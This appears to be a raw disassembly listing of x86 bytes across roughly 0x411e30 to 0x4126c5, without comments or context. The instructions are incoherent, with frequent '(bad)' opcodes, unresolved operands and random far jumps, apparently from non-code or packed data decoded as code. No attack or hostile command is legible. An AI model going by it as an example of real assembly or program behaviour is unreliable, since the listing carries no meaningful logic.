  411e30:	mov    dh,0xa4
  411e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e33:	jae    0x411e23
  411e35:	mov    ecx,DWORD PTR [edi+0x3c]
  411e38:	push   ebp
  411e39:	lahf   
  411e3a:	xor    BYTE PTR [edi-0x7fc00cf9],ah
  411e40:	addr16 addr16 push esp
  411e43:	in     eax,dx
  411e44:	call   0xb7f25027
  411e49:	std    
  411e4a:	enter  0x9187,0x8b
  411e4e:	iret   
  411e4f:	outs   dx,BYTE PTR ds:[esi]
  411e50:	sub    ebp,DWORD PTR [ebp+0x70]
  411e53:	push   es
  411e54:	add    edi,DWORD PTR [edx+0x6975014c]
  411e5a:	sub    eax,0x9adc8ce4
  411e5f:	xchg   DWORD PTR [edx],edi
  411e61:	test   BYTE PTR [ecx-0x79eabd40],0x4a
  411e68:	push   eax
  411e69:	loop   0x411e72
  411e6b:	mov    ds:0xe30a9bf4,eax
  411e70:	and    esp,DWORD PTR [bx]
  411e73:	nop
  411e74:	bnd jne 0x411e5f
  411e77:	sbb    esi,DWORD PTR [edi+eax*2-0x24]
  411e7b:	std    
  411e7c:	push   eax
  411e7d:	retf   0xaf32
  411e80:	sbb    BYTE PTR [edx+0x50f03613],cl
  411e86:	sbb    al,BYTE PTR [esi]
  411e88:	jne    0x411e5e
  411e8a:	inc    esi
  411e8b:	(bad)  
  411e8c:	sub    ecx,DWORD PTR [edx-0x358d4e64]
  411e92:	xor    eax,0xb28d94ef
  411e97:	out    0x9a,al
  411e99:	shl    BYTE PTR [ebx+0x68e3a1f9],1
  411e9f:	mov    al,ds:0xa1fd9c5b
  411ea4:	jb     0x411e8b
  411ea6:	inc    esp
  411ea7:	xor    al,0x63
  411ea9:	sar    DWORD PTR [ebx],cl
  411eab:	adc    al,0xcc
  411ead:	mov    ebp,0x6483667a
  411eb2:	imul   esi,esi,0xeecb0487
  411eb8:	jecxz  0x411e65
  411eba:	ins    BYTE PTR es:[edi],dx
  411ebb:	push   ecx
  411ebc:	add    cl,ah
  411ebe:	lods   al,BYTE PTR ds:[esi]
  411ebf:	or     WORD PTR [ecx+0x27],0x67
  411ec4:	jne    0x411ef3
  411ec6:	mov    dh,0x3c
  411ec8:	enter  0x6879,0x12
  411ecc:	sbb    BYTE PTR [ebp-0x66],0x9b
  411ed0:	fdiv   st,st(3)
  411ed2:	or     ebp,esi
  411ed4:	into   
  411ed5:	add    DWORD PTR [ecx+edi*8-0x5bd404c2],esi
  411edc:	inc    esi
  411edd:	mov    ch,BYTE PTR [ebx]
  411edf:	cmp    DWORD PTR [esi-0x2f],0xffffffe5
  411ee3:	cmp    DWORD PTR [ebp-0x50646556],0x444ed994
  411eed:	sbb    dl,BYTE PTR [ebx+0x1eca50ee]
  411ef3:	xor    ecx,DWORD PTR [esp+ebp*2+0x50347ec8]
  411efa:	fild   DWORD PTR [edi-0x58bf61c9]
  411f00:	inc    esp
  411f01:	and    DWORD PTR [esi+0x53],ebp
  411f04:	dec    edi
  411f05:	sub    eax,0xcd838f7d
  411f0a:	mov    edx,DWORD PTR [esi+0x66]
  411f0d:	mov    esp,0x5d318c6
  411f12:	inc    ebx
  411f13:	adc    eax,DWORD PTR [edi-0x46]
  411f16:	je     0x411f38
  411f18:	ret    
  411f19:	je     0x411f1c
  411f1b:	pusha  
  411f1c:	jb     0x411f26
  411f1e:	int    0x62
  411f20:	xor    BYTE PTR ds:0x79ac2faf,bl
  411f26:	jle    0x411f7e
  411f28:	mov    edx,0xaf1bd484
  411f2d:	mov    ebx,0xc6c69250
  411f32:	dec    DWORD PTR [edx-0x21a307f7]
  411f38:	add    BYTE PTR [ecx],0xf4
  411f3b:	repnz inc ebp
  411f3d:	(bad)  
  411f3f:	lds    ecx,FWORD PTR [ecx+edi*2-0x5e906b76]
  411f46:	mov    BYTE PTR [ebx],bl
  411f48:	xor    DWORD PTR [esi-0x9],0xd8dee8b1
  411f4f:	repnz hlt 
  411f51:	lods   eax,DWORD PTR ds:[esi]
  411f52:	and    bl,BYTE PTR [edx-0x26]
  411f55:	mov    dl,dh
  411f57:	not    BYTE PTR [eax+0x6aa1d7b5]
  411f5d:	into   
  411f5e:	out    dx,al
  411f5f:	adc    al,0xb4
  411f61:	lods   al,BYTE PTR ds:[esi]
  411f62:	mov    ds:0xc3bff0cc,eax
  411f67:	ins    BYTE PTR es:[edi],dx
  411f68:	inc    esp
  411f69:	iret   
  411f6a:	sbb    BYTE PTR [esp+ecx*4+0x20],cl
  411f6e:	sbb    ecx,DWORD PTR [esi+ecx*2-0x26e089d4]
  411f75:	mov    edx,edi
  411f77:	sbb    al,0xec
  411f79:	fnstsw WORD PTR [esi-0x4e]
  411f7c:	adc    ebx,DWORD PTR [eax+ebp*2]
  411f7f:	adc    cl,BYTE PTR [edx+0xde7ce4d]
  411f85:	and    eax,esp
  411f87:	sbb    DWORD PTR [esp+edx*1],edx
  411f8a:	icebp  
  411f8b:	add    al,0xb2
  411f8d:	hlt    
  411f8e:	stos   BYTE PTR es:[edi],al
  411f8f:	and    eax,0x6418f4f5
  411f94:	popf   
  411f95:	jle    0x411f4d
  411f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f98:	dec    edx
  411f99:	arpl   ax,bp
  411f9b:	jmp    0x82b:0x46626873
  411fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa3:	push   0x4f114a6e
  411fa8:	jg     0x411f8a
  411faa:	rol    DWORD PTR [edi-0x64],1
  411fad:	push   0xffffffc2
  411faf:	pop    esp
  411fb0:	jo     0x411f62
  411fb2:	add    al,BYTE PTR [ebx]
  411fb4:	sbb    BYTE PTR [ebp-0xa],ch
  411fb7:	rcr    DWORD PTR [ecx+0x31870ad1],cl
  411fbd:	ds (bad) 
  411fc0:	add    ebp,DWORD PTR [ebx]
  411fc2:	xor    eax,0x15f6e48b
  411fc7:	inc    eax
  411fc8:	clc    
  411fc9:	nop
  411fca:	popa   
  411fcb:	jnp    0x411faf
  411fcd:	jmp    0xd1b6:0x40ea4339
  411fd4:	popa   
  411fd5:	xor    al,0x4e
  411fd7:	or     ebp,ecx
  411fd9:	jno    0x411fea
  411fdb:	test   BYTE PTR [ebx],ah
  411fdd:	data16 cs daa 
  411fe0:	mov    ebx,0x5942141a
  411fe5:	push   ebp
  411fe6:	pop    es
  411fe7:	test   DWORD PTR [ecx],esi
  411fe9:	pusha  
  411fea:	add    al,0x4b
  411fec:	(bad)  
  411fed:	into   
  411fee:	push   ds
  411fef:	adc    ch,BYTE PTR [ecx]
  411ff1:	pop    ecx
  411ff2:	dec    si
  411ff4:	pop    ecx
  411ff5:	addr16 sub ebp,ecx
  411ff8:	out    0x1b,al
  411ffa:	add    ch,BYTE PTR [esi]
  411ffc:	sub    al,0x22
  411ffe:	inc    edi
  411fff:	test   BYTE PTR cs:[eax],dh
  412002:	data16 adc BYTE PTR gs:0x1bc61807,0x72
  41200b:	(bad)  
  41200c:	and    DWORD PTR [esi],ecx
  41200e:	dec    eax
  41200f:	ss inc eax
  412011:	retf   0x1287
  412014:	loope  0x41208d
  412016:	push   edx
  412017:	das    
  412018:	cmp    BYTE PTR [ebp+0x2cedfdcf],cl
  41201e:	shl    BYTE PTR [ecx],0x51
  412021:	leave  
  412022:	add    eax,0x74b44f5d
  412027:	mov    ah,0xdb
  412029:	and    ah,ah
  41202b:	mov    eax,0x332965c4
  412030:	mov    ebp,0x6246d4e3
  412035:	pop    ecx
  412036:	jmp    0x4120b7
  412038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412039:	fs pop es
  41203b:	neg    DWORD PTR [ebp+0x25]
  41203e:	or     ebx,DWORD PTR [ebx+ebp*2-0x77]
  412042:	test   eax,0xc050c910
  412047:	inc    ecx
  412048:	ror    DWORD PTR [ebp-0x4f],1
  41204b:	test   DWORD PTR [ecx+0x1c],0x93b4cbb
  412052:	inc    esp
  412053:	leave  
  412054:	push   ecx
  412055:	nop
  412056:	and    dh,BYTE PTR [ecx+0x4]
  412059:	(bad)
  41205e:	pop    ecx
  41205f:	mov    esi,0x86b35957
  412064:	mov    eax,ds:0xd8205f2d
  412069:	jo     0x412029
  41206b:	ret    
  41206c:	cmc    
  41206d:	mov    eax,0x7f2084c6
  412072:	inc    eax
  412073:	dec    edx
  412074:	call   0x5b34:0x6bc4f8a7
  41207b:	jg     0x412041
  41207d:	or     DWORD PTR [ecx],eax
  41207f:	xchg   ebp,eax
  412080:	fnstsw WORD PTR [ecx+0x58]
  412083:	sbb    DWORD PTR [eax],ebx
  412085:	and    al,dh
  412087:	xor    DWORD PTR [ebx],edi
  412089:	stos   BYTE PTR es:[edi],al
  41208a:	xor    eax,0x4f0aa648
  41208f:	inc    edx
  412090:	leave  
  412091:	sbb    eax,DWORD PTR [edi]
  412093:	and    esi,ebx
  412095:	dec    esp
  412096:	repnz cmp edi,DWORD PTR [edi-0x5d]
  41209a:	xor    DWORD PTR [ecx],ebx
  41209c:	aaa    
  41209d:	add    dh,BYTE PTR [eax+0x3ddf8f76]
  4120a3:	pop    ecx
  4120a4:	das    
  4120a5:	mov    bl,0x25
  4120a7:	stc    
  4120a8:	jns    0x41209b
  4120aa:	js     0x4120f0
  4120ac:	jecxz  0x4120a2
  4120ae:	cwde   
  4120af:	mov    eax,0x7b4f0465
  4120b4:	push   ebp
  4120b5:	push   ebp
  4120b6:	mov    eax,ds:0x219decc7
  4120bb:	and    esi,eax
  4120bd:	jle    0x4120e5
  4120bf:	mov    DWORD PTR es:[esi+eax*4],esi
  4120c3:	out    dx,eax
  4120c4:	sbb    DWORD PTR [ecx+0x6558d02f],eax
  4120ca:	mov    ?,esp
  4120cc:	xor    al,0x89
  4120ce:	into   
  4120cf:	sbb    BYTE PTR [edi+0x68],0x6e
  4120d3:	mov    ebp,0x9dabae0d
  4120d8:	loop   0x412108
  4120da:	mov    ?,WORD PTR [esi+0x29922a52]
  4120e0:	jae    0x41215e
  4120e2:	je     0x412118
  4120e4:	fstp   TBYTE PTR [ebp+0x6efc57a0]
  4120ea:	cmp    edx,DWORD PTR [edi-0x14]
  4120ed:	mov    bh,0xa2
  4120ef:	pop    ecx
  4120f0:	add    eax,0x424bada4
  4120f5:	pop    eax
  4120f6:	fwait
  4120f7:	add    al,0xb0
  4120f9:	inc    esp
  4120fa:	fsubr  QWORD PTR [ebp-0x4e07d7f6]
  412100:	lods   eax,DWORD PTR ds:[esi]
  412101:	rol    DWORD PTR [edi],cl
  412103:	(bad)  
  412104:	pop    ecx
  412105:	test   al,0xaa
  412107:	jns    0x41213f
  412109:	xor    DWORD PTR [ebp-0x72],esp
  41210c:	adc    DWORD PTR [ecx-0x1be390bd],edi
  412112:	data16 mov ds:0xca20f3af,al
  412118:	js     0x412193
  41211a:	push   eax
  41211b:	push   ecx
  41211c:	rcr    DWORD PTR [esi+ebx*2],0x43
  412120:	xor    BYTE PTR [edi],dh
  412122:	mov    bh,0xdb
  412124:	mov    ch,0x6a
  412126:	jns    0x4120c0
  412128:	jb     0x412188
  41212a:	dec    edi
  41212b:	jo     0x412114
  41212d:	pusha  
  41212e:	in     al,dx
  41212f:	push   0xdfb4ad92
  412134:	inc    esi
  412135:	es cmp eax,0xdeb762f0
  41213b:	dec    ebp
  41213c:	ficom  DWORD PTR cs:[eax]
  41213f:	outs   dx,DWORD PTR ds:[esi]
  412140:	mov    ch,0x7
  412142:	(bad)  
  412143:	cli    
  412144:	inc    DWORD PTR [ebp-0x1417485]
  41214a:	loop   0x4121a4
  41214c:	pop    ecx
  41214d:	push   ss
  41214e:	fwait
  41214f:	sbb    edi,DWORD PTR [ebp-0x6278599b]
  412155:	cwde   
  412156:	add    BYTE PTR [esp+eiz*8+0x1d68dc3f],ah
  41215d:	xor    eax,0x7a8a272f
  412162:	dec    eax
  412163:	iret   
  412164:	and    bl,dl
  412166:	inc    eax
  412167:	xor    ecx,esp
  412169:	cmp    ebx,ebx
  41216b:	fistp  QWORD PTR [edi]
  41216d:	xchg   edi,eax
  41216e:	mov    dh,BYTE PTR [esi-0x2973e27d]
  412174:	cmp    eax,0xa96d0ebe
  412179:	jg     0x412107
  41217b:	mov    ds:0x9935e69f,eax
  412180:	addr16 pop ss
  412182:	dec    esi
  412183:	pop    esi
  412184:	aam    0x2
  412186:	imul   esp,DWORD PTR [ebp+0x656233e4],0xffffffaa
  41218d:	xor    eax,0x3bf24445
  412192:	aam    0x78
  412194:	(bad)  
  412195:	fs dec ecx
  412197:	in     al,0x60
  412199:	inc    edx
  41219a:	fldcw  WORD PTR [esi-0x1e]
  41219d:	jg     0x4121a9
  41219f:	es and al,dl
  4121a2:	not    BYTE PTR [esi-0x68b8f2d2]
  4121a8:	cmp    al,0xfe
  4121aa:	ret    
  4121ab:	popa   
  4121ac:	xor    BYTE PTR [eax+ebp*8+0x2b48525b],al
  4121b3:	sbb    ebx,DWORD PTR [esi+esi*2-0x393f80d6]
  4121ba:	lods   al,BYTE PTR ds:[esi]
  4121bb:	sub    eax,0x34308ba3
  4121c0:	jmp    0x5866d967
  4121c5:	mov    ebp,DWORD PTR [eax+0x7342a251]
  4121cb:	pop    edx
  4121cc:	iret   
  4121cd:	pop    ss
  4121ce:	(bad)  
  4121cf:	xor    DWORD PTR [ebp-0x19],esp
  4121d2:	jg     0x4121a0
  4121d4:	in     eax,0x90
  4121d6:	jecxz  0x412210
  4121d8:	mov    dh,0x46
  4121da:	cmp    esi,DWORD PTR [esp+eiz*8+0x1d]
  4121de:	adc    eax,0x5c2238de
  4121e3:	cmp    eax,ecx
  4121e5:	popa   
  4121e6:	cld    
  4121e7:	mov    esp,0xbedfd35b
  4121ec:	pop    ss
  4121ed:	clc    
  4121ee:	iret   
  4121ef:	cmp    BYTE PTR [eax+0x296147fe],0x6c
  4121f6:	shl    ecx,0xd0
  4121f9:	fldenv [edi-0x47]
  4121fc:	dec    edi
  4121fd:	repz cmp eax,0xafa9d482
  412203:	sbb    BYTE PTR [edi+0x61],0x37
  412207:	std    
  412208:	arpl   sp,bx
  41220a:	push   cs
  41220b:	mov    ebp,ecx
  41220d:	sbb    eax,0xd542dbc8
  412212:	inc    edx
  412213:	inc    eax
  412214:	jp     0x41228e
  412216:	arpl   WORD PTR [ebp-0x3f2b67e4],bx
  41221c:	xchg   ecx,eax
  41221d:	imul   esp,DWORD PTR [edx+edx*8],0x25
  412221:	inc    ebp
  412222:	sbb    BYTE PTR [ebx+0x45],ch
  412225:	aas    
  412226:	repz jns 0x41220b
  412229:	sbb    edi,DWORD PTR [edi]
  41222b:	shr    DWORD PTR [ecx+ebx*1-0x4969bcdc],0xab
  412233:	xchg   edi,eax
  412234:	xchg   ecx,eax
  412235:	(bad)  [esi]
  412237:	sahf   
  412238:	sbb    esp,ebx
  41223a:	adc    edx,DWORD PTR [edx-0x19dd2bca]
  412240:	sub    eax,0xf584bf9c
  412245:	dec    edx
  412246:	adc    al,0x51
  412248:	jb     0x412222
  41224a:	xchg   BYTE PTR [eax-0x2c],cl
  41224d:	imul   esp,DWORD PTR [eax],0x51
  412250:	ss sbb ebx,eax
  412253:	dec    edx
  412254:	xchg   ecx,eax
  412255:	ds sub eax,edx
  412258:	daa    
  412259:	stos   DWORD PTR es:[edi],eax
  41225a:	test   al,0xde
  41225c:	push   es
  41225d:	jecxz  0x412284
  41225f:	cmp    dl,BYTE PTR [ecx+ebx*2+0x1c]
  412263:	std    
  412264:	(bad)  
  412265:	aas    
  412266:	jmp    0xa605e906
  41226b:	retf   
  41226c:	sbb    DWORD PTR [ebx-0x78],esi
  41226f:	cmp    DWORD PTR [ebp+0x43fba07c],edi
  412275:	or     al,dh
  412277:	call   0xfdce649c
  41227c:	push   es
  41227d:	push   DWORD PTR [ebx-0x4fbe6ed3]
  412283:	cld    
  412284:	xchg   esi,eax
  412285:	(bad)  
  412286:	outs   dx,BYTE PTR ds:[esi]
  412287:	mov    dh,0x67
  412289:	fcom   DWORD PTR [eax+0x6615ba58]
  41228f:	mov    WORD PTR [eax+edi*2-0x12a5a67f],cs
  412296:	push   0xaee65302
  41229b:	das    
  41229c:	inc    edx
  41229d:	bnd jo 0x41223c
  4122a0:	lods   al,BYTE PTR ds:[esi]
  4122a1:	shl    BYTE PTR [edx],0x50
  4122a4:	jge    0x41228d
  4122a6:	push   ebp
  4122a7:	test   eax,0x80316108
  4122ac:	into   
  4122ad:	jno    0x4122ba
  4122af:	rcl    BYTE PTR [eax-0x43494a93],1
  4122b5:	jno    0x412269
  4122b7:	push   edi
  4122b8:	mov    bh,0x5a
  4122ba:	mov    cl,0xde
  4122bc:	jb     0x412271
  4122be:	popf   
  4122bf:	mov    ebx,ds
  4122c1:	mov    ch,0xa2
  4122c3:	mov    WORD PTR [ebp+esi*2+0x2b],?
  4122c7:	jbe    0x41230a
  4122c9:	push   cs
  4122ca:	lds    esi,FWORD PTR [eax]
  4122cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122cd:	adc    al,0x50
  4122cf:	pop    ds
  4122d0:	mov    esi,0x54b28c9d
  4122d5:	push   es
  4122d6:	jmp    0x4122de
  4122d8:	xchg   eax,ebx
  4122da:	inc    esi
  4122db:	xchg   ebx,eax
  4122dc:	pushf  
  4122dd:	mov    ds:0xb36aa5f4,eax
  4122e2:	xor    esp,DWORD PTR [edi+edx*8-0x5ae4d63]
  4122e9:	fwait
  4122ea:	aam    0x53
  4122ec:	sbb    dh,BYTE PTR [edi]
  4122ee:	jge    0x4122f1
  4122f0:	pop    esp
  4122f1:	pop    edi
  4122f2:	sbb    DWORD PTR [edi],esp
  4122f4:	xchg   edi,eax
  4122f5:	xchg   esi,eax
  4122f6:	inc    ecx
  4122f7:	sub    DWORD PTR [esi-0x56307329],0x52
  4122fe:	push   ss
  4122ff:	sbb    cl,BYTE PTR [edi+0x49800344]
  412305:	push   edi
  412306:	ins    BYTE PTR es:[edi],dx
  412307:	jbe    0x41228e
  412309:	clc    
  41230a:	and    eax,0x7b6d7022
  41230f:	inc    edi
  412310:	cwde   
  412311:	jmp    0xf52c:0x71d4ac77
  412318:	loop   0x4122f0
  41231a:	or     eax,DWORD PTR [edx]
  41231c:	loopne 0x4122d1
  41231e:	adc    ecx,DWORD PTR [edi+eiz*8]
  412321:	sbb    eax,0x25e8abfd
  412326:	shr    al,cl
  412328:	adc    eax,0xcf2199cb
  41232d:	and    DWORD PTR [ebp+0xb],eax
  412330:	sub    ecx,ebx
  412332:	mov    bl,0x93
  412334:	lea    edi,[ecx]
  412336:	mov    DWORD PTR [ebx+edi*4-0x20],eax
  41233a:	or     DWORD PTR [ebx],0xba3e5e9e
  412340:	inc    ecx
  412341:	call   0x14662ab6
  412346:	cmp    edx,esp
  412348:	or     BYTE PTR [edi-0x6],ah
  41234b:	bound  ebp,QWORD PTR [esi]
  41234d:	lock popa 
  41234f:	adc    eax,0x96b9b72f
  412354:	mov    gs,WORD PTR [esi+0x4]
  412357:	mov    edx,DWORD PTR [eax+0x1]
  41235a:	mov    esi,0x69556de5
  41235f:	call   0xbce8:0xd3a0c88
  412366:	std    
  412367:	int3   
  412368:	and    DWORD PTR [esp+esi*2+0x74],esi
  41236c:	aas    
  41236d:	pop    ds
  41236e:	sub    ebx,DWORD PTR [ebp+0x7]
  412371:	or     ecx,0xffffffe3
  412374:	or     al,0xaf
  412376:	femms  
  412378:	sub    ah,bh
  41237a:	call   0xb5b8:0xfdee3626
  412381:	xchg   ecx,eax
  412382:	dec    edx
  412383:	and    BYTE PTR [ecx],bl
  412385:	cmp    BYTE PTR [esi-0x68671bd3],0xb4
  41238c:	push   edx
  41238d:	xchg   esp,eax
  41238e:	and    al,0xef
  412390:	dec    ecx
  412391:	xchg   ebp,eax
  412392:	ret    
  412393:	dec    ebx
  412394:	add    BYTE PTR [edx-0x3cd15c98],cl
  41239a:	mov    al,ds:0xdac7646a
  41239f:	loope  0x4123d5
  4123a1:	xor    esi,DWORD PTR [ebx+0x64]
  4123a4:	retf   
  4123a5:	jle    0x4123bf
  4123a7:	xor    DWORD PTR [edx+0x7e],0x6503e19c
  4123ae:	xchg   esi,eax
  4123af:	mov    al,0xf9
  4123b1:	mov    eax,0x4cdf760c
  4123b6:	je     0x4123ab
  4123b8:	inc    ecx
  4123b9:	test   al,0xe3
  4123bb:	push   0xffffffb8
  4123bd:	pushf  
  4123be:	sqrtps xmm6,XMMWORD PTR [ebp-0x6ba08ab3]
  4123c5:	lods   al,BYTE PTR ds:[esi]
  4123c6:	mov    BYTE PTR [edi-0x7c2e9629],dl
  4123cc:	js     0x412438
  4123ce:	and    BYTE PTR [edx+eiz*4+0x12c13c38],dl
  4123d5:	jae    0x41237c
  4123d7:	inc    ebx
  4123d8:	xlat   BYTE PTR ds:[ebx]
  4123d9:	lods   eax,DWORD PTR ds:[esi]
  4123db:	xchg   ebp,eax
  4123dc:	xchg   ecx,eax
  4123dd:	push   esi
  4123de:	pushf  
  4123df:	pop    ss
  4123e0:	add    cl,ch
  4123e2:	sub    BYTE PTR [ebx-0x3a],bl
  4123e5:	imul   ebp,DWORD PTR [edx+0x6a],0x65
  4123e9:	dec    ebx
  4123ea:	(bad)  
  4123eb:	jge    0x4123ac
  4123ed:	clc    
  4123ee:	or     DWORD PTR [esi+ecx*1-0x17],ecx
  4123f2:	jmp    ecx
  4123f4:	fcomp  DWORD PTR [edx+0x70cc77fe]
  4123fa:	xchg   esi,eax
  4123fb:	enter  0xebbf,0x26
  4123ff:	outs   dx,BYTE PTR ds:[esi]
  412400:	aaa    
  412401:	pop    ss
  412402:	or     bl,cl
  412404:	ds xor eax,0x61f24766
  41240a:	jb     0x4123f5
  41240c:	data16 icebp 
  41240e:	and    ebp,DWORD PTR [esi+0x76]
  412411:	xor    al,0x49
  412413:	push   esi
  412414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412415:	call   0xcf28191d
  41241a:	jg     0x412454
  41241c:	dec    edi
  41241d:	mov    BYTE PTR [ebx],dh
  41241f:	out    0x74,al
  412421:	jge    0x4123d4
  412423:	scas   eax,DWORD PTR es:[edi]
  412424:	sahf   
  412425:	mov    bl,ch
  412427:	xchg   bx,ax
  412429:	mov    edi,0x892084f4
  41242e:	inc    esi
  41242f:	cld    
  412430:	sbb    BYTE PTR [eax],dl
  412432:	mov    dh,0x9d
  412434:	xchg   esi,eax
  412435:	mov    ebp,DWORD PTR [edx+0x23]
  412438:	or     bh,BYTE PTR [eax+ecx*2+0x5030f633]
  41243f:	imul   esi,ecx,0x8b99af98
  412445:	ret    
  412446:	jb     0x41243d
  412448:	add    edx,edi
  41244a:	push   esi
  41244b:	fld    DWORD PTR [ecx+0x31c8a650]
  412451:	ja     0x41241b
  412453:	fs sti 
  412455:	test   al,0xb6
  412457:	test   eax,0xf7f2bd58
  41245c:	pop    edi
  41245d:	mov    gs,WORD PTR [ecx+ebx*1]
  412460:	fst    DWORD PTR fs:[esp+ebp*1+0x62]
  412465:	cwde   
  412466:	adc    ch,ch
  412468:	or     ah,bh
  41246a:	rol    DWORD PTR [edx+0x2e],1
  41246d:	adc    BYTE PTR [ebx+edi*1-0x465b2ac4],ah
  412474:	mov    ch,BYTE PTR [edx-0xf54872e]
  41247a:	arpl   WORD PTR [ebx-0x55],bp
  41247d:	mov    bl,BYTE PTR ds:0x2a19b4e8
  412483:	leave  
  412484:	xor    bh,bl
  412486:	aam    0x73
  412488:	popf   
  412489:	pop    edi
  41248a:	pop    eax
  41248b:	add    DWORD PTR [esp+eiz*8+0xd601322],esi
  412492:	iret   
  412493:	adc    al,al
  412495:	arpl   WORD PTR [eax+eax*1],cx
	...
  412514:	cmp    BYTE PTR [edx-0x26147f15],dh
  41251a:	jnp    0x4124d6
  41251c:	imul   ecx,DWORD PTR [edx],0x6
  41251f:	and    esi,edi
  412521:	adc    al,0xcb
  412523:	sbb    eax,DWORD PTR [ebx]
  412525:	into   
  412526:	add    BYTE PTR [eax],al
  412528:	imul   eax,DWORD PTR [edi],0x0
  41252b:	add    BYTE PTR [edi],bl
  41252d:	pop    es
  41252e:	les    ebp,FWORD PTR [ebx-0x5a]
  412531:	jno    0x4124bc
  412533:	push   es
  412534:	leave  
  412535:	fadd   DWORD PTR [edi+0xf]
  412538:	sub    eax,0xa0e0987b
  41253d:	fld    QWORD PTR [eax-0x5474ebc6]
  412543:	ja     0x4124f0
  412545:	add    al,ah
  412547:	and    DWORD PTR cs:[ecx-0x18f9657a],eax
  41254e:	cmp    DWORD PTR [ecx+ebx*2+0x22],edx
  412552:	dec    esp
  412553:	(bad)  
  412554:	in     al,dx
  412555:	mov    ecx,0xc79e8017
  41255a:	jp     0x412537
  41255c:	mov    ds:0x68f52b14,al
  412561:	dec    edi
  412562:	inc    esp
  412563:	push   eax
  412564:	fisub  DWORD PTR [edx]
  412566:	sahf   
  412567:	sahf   
  412568:	arpl   WORD PTR [edx+0x5449ec91],sp
  41256e:	add    dh,al
  412570:	pushf  
  412571:	or     eax,0x4f65f566
  412576:	jae    0x412596
  412578:	aas    
  412579:	and    BYTE PTR [edi+ebp*8-0x3627b509],cl
  412580:	(bad)  
  412581:	popa   
  412582:	adc    eax,0x6d018949
  412587:	into   
  412588:	jmp    0xff43:0xc029e10b
  41258f:	ds cmp eax,0x9f1e349b
  412595:	inc    ebx
  412596:	add    BYTE PTR [edi-0x5],dl
  412599:	jb     0x4125c3
  41259b:	imul   eax,DWORD PTR [ecx],0x7efa4fe1
  4125a1:	int3   
  4125a2:	(bad)  
  4125a3:	dec    esi
  4125a4:	pop    edx
  4125a5:	adc    edi,DWORD PTR [esp+edx*1+0x4cb3171e]
  4125ac:	jp     0x41258c
  4125ae:	mov    ch,0x9
  4125b0:	mov    ch,0xcc
  4125b2:	add    cl,ch
  4125b4:	hlt    
  4125b5:	mov    ds:0xd6db5b69,eax
  4125ba:	add    al,0x79
  4125bc:	test   BYTE PTR [ebp+eiz*2-0x37],bh
  4125c0:	int3   
  4125c1:	mov    WORD PTR [ecx-0xaa20c1d],?
  4125c7:	cmc    
  4125c8:	in     al,dx
  4125c9:	inc    edx
  4125ca:	cmp    dl,BYTE PTR [ebx+0x364418ba]
  4125d0:	sbb    al,0xf9
  4125d2:	mov    ebx,0x22bdc805
  4125d7:	aas    
  4125d8:	inc    edx
  4125d9:	aad    0x75
  4125db:	ret    0x5438
  4125de:	pop    ecx
  4125df:	mov    ebp,0x52dec513
  4125e4:	in     al,0x8b
  4125e6:	(bad)  
  4125e7:	out    dx,eax
  4125e8:	mov    ecx,0x3b147c39
  4125ed:	inc    esp
  4125ee:	mov    esp,0xafa823be
  4125f3:	ret    
  4125f4:	mov    esi,0xed4a4cc5
  4125f9:	ds cld 
  4125fb:	mov    ah,BYTE PTR [eax-0x17b44248]
  412601:	pushf  
  412602:	in     al,dx
  412603:	dec    ebp
  412604:	mov    ds:0x24c9c422,al
  412609:	fldcw  WORD PTR [eax-0x7ded312e]
  41260f:	dec    eax
  412610:	push   ss
  412611:	sbb    al,0x30
  412613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412614:	fldenv ds:0x35224893
  41261a:	mov    WORD PTR [esi-0x5389096c],cs
  412620:	fstp   st(0)
  412622:	pop    ebx
  412623:	mov    WORD PTR [ecx-0x12ac994],ss
  412629:	fs scas eax,DWORD PTR es:[edi]
  41262b:	fcomp  QWORD PTR [esi+ecx*1-0x58]
  41262f:	mov    dh,0x8c
  412631:	outs   dx,DWORD PTR ds:[esi]
  412632:	push   esp
  412633:	mov    ch,0x7e
  412635:	pop    eax
  412636:	loop   0x412674
  412638:	sbb    dl,cl
  41263a:	(bad)  [ebx-0x61]
  41263d:	leave  
  41263e:	in     al,0xd9
  412640:	or     eax,0xc98dac5e
  412645:	in     eax,dx
  412646:	dec    edx
  412647:	fisubr DWORD PTR [ecx-0x7c]
  41264a:	stos   DWORD PTR es:[edi],eax
  41264b:	lds    ebp,FWORD PTR [edx+0x29]
  41264e:	xor    BYTE PTR [edx-0xcee9a9a],dl
  412654:	inc    ebp
  412655:	sub    BYTE PTR ss:[edi+edi*8],ah
  412659:	jg     0x412608
  41265b:	inc    eax
  41265c:	retf   
  41265d:	or     DWORD PTR [ebp+eax*1+0x5192c16c],eax
  412664:	pop    ebx
  412665:	pop    esi
  412666:	inc    esi
  412667:	add    DWORD PTR [esi+0x66fb6a65],ebp
  41266d:	and    DWORD PTR [eax-0x6e],esp
  412670:	jb     0x412664
  412672:	mov    esi,0xef1f7c91
  412677:	out    dx,al
  412678:	jmp    0x6994:0xa0780351
  41267f:	clc    
  412680:	jne    0x412608
  412682:	adc    BYTE PTR [ecx-0x29],0x16
  412686:	push   ebp
  412687:	leave  
  412688:	and    ah,BYTE PTR [edi-0x77]
  41268b:	cmc    
  41268c:	popa   
  41268d:	in     al,dx
  41268e:	pop    eax
  41268f:	pusha  
  412690:	aam    0xcc
  412692:	out    dx,al
  412693:	shl    BYTE PTR ds:0xb7597f1e,cl
  412699:	mov    DWORD PTR [esi],ecx
  41269b:	pusha  
  41269c:	icebp  
  41269d:	mov    cl,BYTE PTR [ecx-0x2acd4e7e]
  4126a3:	test   DWORD PTR [edx+0x3e],0xa8b40782
  4126aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126ab:	xchg   esp,eax
  4126ac:	xor    BYTE PTR [ebx],dh
  4126ae:	push   cs
  4126af:	pop    edx
  4126b0:	fst    QWORD PTR [ebx+0x2388914f]
  4126b6:	sar    BYTE PTR [edi],1
  4126b8:	pop    edx
  4126b9:	lea    ebp,[esi-0x4710c6a4]
  4126bf:	or     bl,BYTE PTR [esi+0x5f]
  4126c2:	or     esp,ecx
  4126c4:	inc    edx
  4126c5:	shr    BYTE PTR [edi],0xa8
